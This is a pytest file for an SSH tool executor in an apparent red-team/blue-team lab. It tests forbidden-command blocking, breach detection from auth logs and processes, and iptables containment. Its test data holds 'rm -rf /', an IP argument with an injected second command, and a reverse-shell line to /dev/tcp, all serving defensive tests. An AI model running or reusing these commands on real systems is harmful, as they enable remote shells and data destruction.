import datetime
import subprocess
import pytest
from unittest.mock import MagicMock, patch
from src.executor import (
    MAX_LOG_EVENTS,
    SSH_MASTER_EXPECT,
    SSH_JUMP_SESSION_EXPECT,
    ToolExecutor,
)


def _executor():
    return ToolExecutor(host="192.168.64.10", user="vagrant", pwd="vagrant", timeout=30)


def test_run_session_returns_cleaned_output():
    # A command rides the existing ControlMaster socket — no password/expect.
    executor = _executor()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = subprocess.CompletedProcess(
            args=["ssh"],
            returncode=0,
            stdout=(
                "Warning: Permanently added '192.168.64.10' (ED25519) to the list of known hosts.\n"
                "vagrant\n"
            ),
            stderr="",
        )
        ok, text = executor._run_session("whoami")

    assert ok is True
    assert text.strip() == "vagrant"
    argv = mock_run.call_args.args[0]
    assert argv[0] == "ssh"
    assert f"ControlPath={executor._control_path}" in argv
    assert "BatchMode=yes" in argv


def test_run_session_flags_dropped_master():
    # ssh exit 255 with no stdout means the control socket is gone — signal retry.
    executor = _executor()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = subprocess.CompletedProcess(
            args=["ssh"],
            returncode=255,
            stdout="",
            stderr="control socket connect: No such file or directory",
        )
        ok, _ = executor._run_session("whoami")

    assert ok is False


def test_execute_forbidden_command_blocked_before_network():
    executor = _executor()
    with patch("subprocess.run") as mock_run, \
         pytest.raises(ValueError, match="Forbidden command"):
        executor.execute("rm -rf /")
    mock_run.assert_not_called()


def test_execute_self_heals_when_master_dropped():
    # First attempt hits a dead master; executor reconnects once and retries.
    executor = _executor()
    executor._master_alive = MagicMock(return_value=True)
    executor.connect = MagicMock()
    executor.disconnect = MagicMock()
    executor._run_session = MagicMock(side_effect=[(False, "dropped"), (True, "vagrant\n")])

    result = executor.execute("whoami")

    assert result == "vagrant\n"
    executor.connect.assert_called_once()
    assert executor._run_session.call_count == 2


def test_connect_opens_master_with_expect():
    executor = _executor()
    with patch("subprocess.run") as mock_run, \
         patch.object(executor, "_master_alive", side_effect=[False, True]):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["expect"], returncode=0, stdout="", stderr="",
        )
        executor.connect()

    argv = mock_run.call_args.args[0]
    env = mock_run.call_args.kwargs["env"]
    assert argv[0] == "expect"
    assert argv[-1] == SSH_MASTER_EXPECT
    assert env["PL_SSH_CONTROL"] == executor._control_path
    assert env["PL_SSH_HOST"] == "192.168.64.10"


def _jump_executor():
    return ToolExecutor(
        host="192.168.64.12", user="vagrant", pwd="vagrant",
        jump_host="192.168.64.11", jump_user="kali", jump_pwd="kali",
    )


def test_jump_command_runs_per_call_session_with_both_hops():
    executor = _jump_executor()
    assert executor._uses_jump is True
    # A jump command is a fresh expect session (SSH_JUMP_SESSION_EXPECT), not a
    # master ride; it must carry both hops' creds and the command verbatim.
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = subprocess.CompletedProcess(
            args=["expect"], returncode=0, stdout="vagrant\n", stderr="",
        )
        out = executor.execute_remote("whoami")

    assert out.strip() == "vagrant"
    argv = mock_run.call_args.args[0]
    env = mock_run.call_args.kwargs["env"]
    assert argv[-1] == SSH_JUMP_SESSION_EXPECT
    assert env["PL_SSH_JUMP_HOST"] == "192.168.64.11"
    assert env["PL_SSH_JUMP_USER"] == "kali"
    assert env["PL_SSH_JUMP_PASSWORD"] == "kali"
    assert env["PL_SSH_HOST"] == "192.168.64.12"
    assert env["PL_SSH_COMMAND"] == "whoami"
    assert env["PL_SSH_CONFIG"] == executor._ssh_config_path
    # The ssh_config was written and carries a Host * block for both hops.
    with open(executor._ssh_config_path, encoding="utf-8") as f:
        assert "Host *" in f.read()


def test_jump_connect_validates_chain_with_probe():
    executor = _jump_executor()
    with patch.object(executor, "_run_jump_session", return_value="__PL_CONNECT_OK__\n") as probe:
        executor.connect()  # must not raise
    assert probe.call_args.args[0] == "echo __PL_CONNECT_OK__"


def test_jump_connect_raises_when_probe_fails():
    executor = _jump_executor()
    with patch.object(executor, "_run_jump_session", return_value="Remote command failed with exit code 5."), \
         pytest.raises(RuntimeError, match="via jump"):
        executor.connect()


def test_jump_executor_never_opens_a_master():
    # Forbidden-command checks still fire, and nothing touches the direct master.
    executor = _jump_executor()
    with patch("subprocess.run") as mock_run, \
         pytest.raises(ValueError, match="Forbidden command"):
        executor.execute_remote("rm -rf /")
    mock_run.assert_not_called()


def test_no_jump_configured_uses_direct_template():
    executor = _executor()
    assert executor._uses_jump is False
    with patch("subprocess.run") as mock_run, \
         patch.object(executor, "_master_alive", side_effect=[False, True]):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["expect"], returncode=0, stdout="", stderr="",
        )
        executor.connect()
    assert mock_run.call_args.args[0][-1] == SSH_MASTER_EXPECT
    assert "PL_SSH_JUMP_HOST" not in mock_run.call_args.kwargs["env"]


def test_connect_raises_when_master_never_comes_up():
    executor = _executor()
    with patch("subprocess.run") as mock_run, \
         patch.object(executor, "_master_alive", return_value=False):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["expect"], returncode=5, stdout="Permission denied, please try again.", stderr="",
        )
        with pytest.raises(RuntimeError, match="Failed to establish SSH master"):
            executor.connect()


def test_mark_analysis_window_reads_target_wall_clock():
    from src.executor import _syslog_line_epoch
    executor = _executor()
    # Target wall clock as syslog-style text, parsed in the same frame as log
    # lines so a controller/target timezone gap can't skew the window.
    # Two reads: the wall clock for the window, then $SSH_CONNECTION for blue's
    # own source IP.
    executor.execute = MagicMock(side_effect=[
        "2026 Oct  8 22:22:16\n",
        "192.168.64.1 51000 192.168.64.12 22\n",
    ])
    executor.mark_analysis_window()
    assert executor._analysis_year == 2026
    assert executor.analysis_since == _syslog_line_epoch("Oct  8 22:22:16", 2026, None)
    assert executor.execute.call_args_list[0].args[0] == 'date "+%Y %b %e %H:%M:%S"'
    assert executor.execute.call_args_list[1].args[0] == "echo $SSH_CONNECTION"
    assert executor.control_source_ip == "192.168.64.1"


_WINDOW_START = datetime.datetime(2026, 10, 8, 12, 0, 0)
_STALE_FLAG_LINE = (
    "Sep 16 22:59:12 ubuntu sudo:  vagrant : TTY=unknown ; PWD=/home/vagrant ; "
    "USER=root ; COMMAND=/usr/bin/tee /root/flag.txt"
)
_RECENT_FLAG_LINE = (
    "Oct 8 12:05:00 ubuntu sudo:  vagrant : TTY=pts/0 ; PWD=/home/vagrant ; "
    "USER=root ; COMMAND=/bin/cat /root/flag.txt"
)


def test_analysis_window_excludes_stale_flag_access():
    # The exact bug: a weeks-old flag-provisioning line must NOT win for blue.
    executor = _executor()
    executor.analysis_since = _WINDOW_START.timestamp()
    executor._analysis_year = 2026
    result = executor._parse_auth_log(_STALE_FLAG_LINE)
    assert result["flag_access_detected"] is False
    assert result["events"] == []
    assert result["assessment"] != "BREACH"


def test_analysis_window_keeps_in_window_flag_access():
    executor = _executor()
    executor.analysis_since = _WINDOW_START.timestamp()
    executor._analysis_year = 2026
    result = executor._parse_auth_log(_RECENT_FLAG_LINE)
    assert result["flag_access_detected"] is True
    assert result["assessment"] == "BREACH"


def test_no_window_set_preserves_full_history_behavior():
    # Default (no window) keeps the original behavior — stale line still flagged.
    executor = _executor()
    assert executor.analysis_since is None
    result = executor._parse_auth_log(_STALE_FLAG_LINE)
    assert result["flag_access_detected"] is True

def test_blue_own_control_session_login_is_not_flagged():
    # Blue authenticates from its own control IP on every command; that login
    # must be marked self/informational and never land in the IOC set.
    executor = _executor()
    executor.control_source_ip = "192.168.64.1"
    line = (
        "Oct 16 10:00:00 ubuntu sshd[1000]: Accepted password for vagrant "
        "from 192.168.64.1 port 51000 ssh2"
    )
    result = executor._parse_auth_log(line)
    assert "192.168.64.1" not in result["suspicious_ips"]
    assert result["assessment"] == "CLEAN"
    assert result["events"][0]["severity"] == "informational"


def test_attacker_login_from_other_ip_is_ioc():
    executor = _executor()
    executor.control_source_ip = "192.168.64.1"
    line = (
        "Oct 16 10:00:00 ubuntu sshd[1000]: Accepted password for vagrant "
        "from 192.168.64.11 port 51000 ssh2"
    )
    result = executor._parse_auth_log(line)
    assert "192.168.64.11" in result["suspicious_ips"]


def test_blue_flag_inspection_is_not_a_breach():
    # investigate_file_access runs `sudo stat/ls /root/flag.txt`; those touch the
    # flag path but only read metadata, so they must NOT score as a compromise.
    executor = _executor()
    for verb in ("/usr/bin/stat", "/bin/ls -la"):
        line = (
            f"Oct 16 10:05:00 ubuntu sudo:  vagrant : TTY=unknown ; PWD=/ ; "
            f"USER=root ; COMMAND={verb} /root/flag.txt"
        )
        result = executor._parse_auth_log(line)
        assert result["flag_access_detected"] is False, verb
        assert result["assessment"] != "BREACH", verb


def test_attacker_flag_read_is_a_breach():
    executor = _executor()
    line = (
        "Oct 16 10:06:00 ubuntu sudo:  vagrant : TTY=unknown ; PWD=/ ; "
        "USER=root ; COMMAND=/usr/bin/cat /root/flag.txt"
    )
    result = executor._parse_auth_log(line)
    assert result["flag_access_detected"] is True
    assert result["assessment"] == "BREACH"


_PS_HEADER = "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND"


def test_investigate_processes_ignores_benign_baseline_services():
    # The live false positive: baseline tcpdump/sshd flagged critical → BREACH.
    executor = _executor()
    ps = "\n".join([
        _PS_HEADER,
        "root  2902 3.0 0.1 1000 2000 ?  Ss 10:00 0:01 tcpdump -i any",
        "root     1 0.0 0.0  100  200 ?  Ss 09:00 0:00 /sbin/init",
    ])
    executor.execute = MagicMock(return_value=ps)
    result = executor.investigate_processes()
    assert result["critical_count"] == 0
    assert result["assessment"] != "BREACH"
    tcp = [p for p in result["processes"] if "tcpdump" in p["command"]][0]
    assert tcp["suspicious"] is False


def test_investigate_processes_flags_flag_read_and_reverse_shell():
    executor = _executor()
    ps = "\n".join([
        _PS_HEADER,
        "root    3100 0.0 0.0 100 200 ? S 10:01 0:00 cat /root/flag.txt",
        "vagrant 3200 0.0 0.0 100 200 ? S 10:02 0:00 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    ])
    executor.execute = MagicMock(return_value=ps)
    result = executor.investigate_processes()
    assert result["critical_count"] >= 2
    assert result["assessment"] == "BREACH"


def _plwatch(src, dpt):
    return (f"Oct 16 10:00:00 ubuntu kernel: [1.0] PLWATCH IN=eth1 OUT= "
            f"SRC={src} DST=192.168.64.12 LEN=52 PROTO=TCP SPT=5000 DPT={dpt} SYN")


def test_connections_flags_port_scan_from_foreign_ip():
    executor = _executor()
    executor._conn_logging = True
    executor.control_source_ip = "192.168.64.1"
    raw = "\n".join(_plwatch("192.168.64.11", p) for p in (22, 80, 443, 3306, 21, 8080)) + \
          "\n" + _plwatch("192.168.64.1", 22)  # blue's own session — must be ignored
    result = executor._parse_connections(raw)
    assert result["suspicious_ips"] == ["192.168.64.11"]
    assert result["port_scanners"] == ["192.168.64.11"]
    assert "192.168.64.1" not in result["suspicious_ips"]
    assert result["assessment"] == "SUSPICIOUS"


def test_connections_foreign_without_scan_is_monitor_not_suspicious():
    # A couple of connections from a foreign IP (below the scan threshold) is not
    # actionable malice — it must NOT land in suspicious_ips (blue mustn't contain
    # on mere presence).
    executor = _executor()
    executor._conn_logging = True
    executor.control_source_ip = "192.168.64.1"
    raw = _plwatch("192.168.64.11", 22) + "\n" + _plwatch("192.168.64.11", 80)
    result = executor._parse_connections(raw)
    assert result["foreign_ips"] == ["192.168.64.11"]
    assert result["suspicious_ips"] == []
    assert result["port_scanners"] == []
    assert result["assessment"] == "MONITOR"


def test_connections_clean_when_only_self_and_loopback():
    executor = _executor()
    executor._conn_logging = True
    executor.control_source_ip = "192.168.64.1"
    raw = _plwatch("192.168.64.1", 22) + "\n" + _plwatch("127.0.0.1", 631)
    result = executor._parse_connections(raw)
    assert result["suspicious_ips"] == []
    assert result["assessment"] == "CLEAN"


def test_connections_reports_when_logging_not_armed():
    executor = _executor()
    executor._conn_logging = False
    result = executor._parse_connections("Remote command executed successfully (no output).")
    assert result["logging_active"] is False
    assert result["assessment"] == "CLEAN"
    assert "not armed" in result["summary"]


def test_enable_connection_logging_arms_rule():
    executor = _executor()
    executor.execute = MagicMock(return_value="PL_ADDED\n")
    assert executor.enable_connection_logging() is True
    assert executor._conn_logging is True
    assert "PLWATCH" in executor.execute.call_args.args[0]


def test_contain_attacker_blocks_ip_and_tracks_rule():
    executor = _executor()
    executor.execute = MagicMock(return_value="PL_ADDED\n")
    result = executor.contain_attacker("192.168.64.11")
    assert result["contained"] is True
    assert result["assessment"] == "CONTAINED"
    assert "192.168.64.11" in executor._contained_ips
    # The command actually inserts a DROP rule for that source.
    assert "iptables -I INPUT -s 192.168.64.11 -j DROP" in executor.execute.call_args.args[0]


def test_contain_attacker_refuses_blues_own_ip():
    executor = _executor()
    executor.control_source_ip = "192.168.64.1"
    executor.execute = MagicMock()
    result = executor.contain_attacker("192.168.64.1")
    assert result["contained"] is False
    assert result["assessment"] == "REFUSED"
    executor.execute.assert_not_called()  # never touches the firewall
    assert executor._contained_ips == []


def test_contain_attacker_rejects_non_ip_without_shelling_out():
    executor = _executor()
    executor.execute = MagicMock()
    result = executor.contain_attacker("1.2.3.4; rm -rf /")
    assert result["contained"] is False
    executor.execute.assert_not_called()


def test_disconnect_flushes_contained_rules():
    executor = _executor()
    executor._contained_ips = ["192.168.64.11"]
    executor._master_alive = MagicMock(return_value=True)
    executor.execute_remote = MagicMock(return_value="")
    executor.disconnect()
    assert "iptables -D INPUT -s 192.168.64.11 -j DROP" in executor.execute_remote.call_args.args[0]
    assert executor._contained_ips == []


def test_parse_auth_log_returns_findings():
    executor = ToolExecutor(host="localhost", user="testuser", pwd="testpassword")
    raw = (
        "Oct 16 10:01:00 mock sudo: msfadmin : TTY=pts/0 ; "
        "PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /root/flag.txt"
    )

    result = executor._parse_auth_log(raw)

    assert result["tool"] == "investigate_logs"
    assert result["flag_access_detected"] is True
    assert result["assessment"] == "BREACH"

def test_parse_auth_log_caps_events_without_losing_breach_signals():
    executor = ToolExecutor(host="localhost", user="testuser", pwd="testpassword")
    noisy_logins = [
        f"Oct 16 10:{minute:02}:00 mock sshd[10{minute}]: "
        f"Accepted password for vagrant from 192.168.64.{minute % 10} port 50{minute} ssh2"
        for minute in range(40)
    ]
    flag_access = (
        "Oct 16 11:01:00 mock sudo: msfadmin : TTY=pts/0 ; "
        "PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /root/flag.txt"
    )
    noisy_sessions = [
        f"Oct 16 11:{minute:02}:00 mock sshd[20{minute}]: "
        "pam_unix(sshd:session): session opened for user vagrant by (uid=0)"
        for minute in range(40)
    ]

    result = executor._parse_auth_log("\n".join(noisy_logins + [flag_access] + noisy_sessions))

    assert result["total_events"] == 81
    assert result["parsed_events"] == 81
    assert result["events_returned"] == MAX_LOG_EVENTS
    assert result["events_omitted"] == 81 - MAX_LOG_EVENTS
    assert result["flag_access_detected"] is True
    assert result["critical_events"] == 1
    assert result["assessment"] == "BREACH"
    assert any("/root/flag.txt" in event["raw"] for event in result["events"])

def test_investigate_file_access_returns_structured_findings():
    executor = ToolExecutor(host="localhost", user="testuser", pwd="testpassword")
    executor.execute = MagicMock(side_effect=[
        "type=SYSCALL msg=audit(1.0:1): uid=1000 comm=\"cat\"",
        "  File: '/root/flag.txt'\nAccess: 2026-09-17 10:16:00",
        "-rw------- 1 root root 23 Sep 17 10:16 /root/flag.txt",
    ])

    result = executor.investigate_file_access("/root/flag.txt")

    assert result["tool"] == "investigate_file_access"
    assert result["file_exists"] is True
    assert result["assessment"] == "BREACH"


_NO_OUTPUT = "Remote command executed successfully (no output)."
_LS_FLAG = "-rw-r--r-- 1 root root 26 Sep 16 23:10 /root/flag.txt"


def test_file_access_breach_from_atime_in_window_without_auditd():
    # The live gap: no auditd, but the flag's atime lands inside blue's window,
    # so the read must be detected deterministically from stat alone.
    executor = _executor()
    executor.analysis_since = 1760000000.0
    executor.execute = MagicMock(side_effect=[
        _NO_OUTPUT,                               # ausearch: no auditd
        "1760000500 1759000000 1759000000 root 644",  # stat: atime > window start
        _LS_FLAG,
    ])

    result = executor.investigate_file_access("/root/flag.txt")

    assert result["audit_available"] is False
    assert result["flag_access_detected"] is True
    assert result["assessment"] == "BREACH"


def test_file_access_stale_atime_is_not_breach():
    # Flag last read before the engagement window and never after its last
    # write — must NOT be scored as a breach for this run.
    executor = _executor()
    executor.analysis_since = 1760000000.0
    executor.execute = MagicMock(side_effect=[
        _NO_OUTPUT,
        "1759999000 1759999000 1759999000 root 644",  # atime < window, == mtime
        _LS_FLAG,
    ])

    result = executor.investigate_file_access("/root/flag.txt")

    assert result["flag_access_detected"] is False
    assert result["assessment"] != "BREACH"


def test_file_access_no_output_sentinel_is_not_audit_available():
    # The sentinel the executor returns for a successful no-output command must
    # not be mistaken for real audit data (the old false-CLEAN bug).
    executor = _executor()
    executor.execute = MagicMock(side_effect=[_NO_OUTPUT, _NO_OUTPUT, _LS_FLAG])

    result = executor.investigate_file_access("/root/flag.txt")

    assert result["audit_available"] is False
    assert result["file_exists"] is True

def test_parse_auth_log_empty_read_is_unavailable_not_clean():
    # An empty/unreadable auth.log (or the executor's no-output sentinel) is a
    # SENSOR GAP, not a clean box — the old code reported CLEAN and hid outages.
    executor = ToolExecutor(host="localhost", user="testuser", pwd="testpassword")
    for raw in ("", "true", "Remote command executed successfully (no output)."):
        result = executor._parse_auth_log(raw)
        assert result["assessment"] == "UNAVAILABLE", f"raw={raw!r}"
        assert result["flag_access_detected"] is False


def test_set_target_credential_rejects_defender_accounts():
    ex = ToolExecutor(host="h", user="", pwd="", require_foothold=True)
    for acct in ("vagrant", "VAGRANT", "root"):
        r = ex.set_target_credential(acct, "pw")
        assert r["status"] == "rejected", acct
    assert ex._has_foothold is False

def test_target_execution_refused_without_foothold():
    ex = ToolExecutor(host="h", user="", pwd="", require_foothold=True)
    out = ex.execute_remote("id")
    assert "No foothold" in out
    assert ex._has_foothold is False

def test_set_target_credential_success_establishes_foothold():
    ex = ToolExecutor(host="h", user="", pwd="", require_foothold=True)
    ex._run_session = lambda cmd: (True, "han_solo\n")  # validated login returns the user
    r = ex.set_target_credential("han_solo", "nerfherder")
    assert r["status"] == "success" and r["whoami"] == "han_solo"
    assert ex._has_foothold is True and ex.user == "han_solo" and ex.pwd == "nerfherder"

def test_set_target_credential_failure_keeps_no_foothold():
    ex = ToolExecutor(host="h", user="", pwd="", require_foothold=True)
    ex._run_session = lambda cmd: (True, "Permission denied (publickey,password).")
    r = ex.set_target_credential("han_solo", "wrongpw")
    assert r["status"] == "failed"
    assert ex._has_foothold is False and ex.user == ""
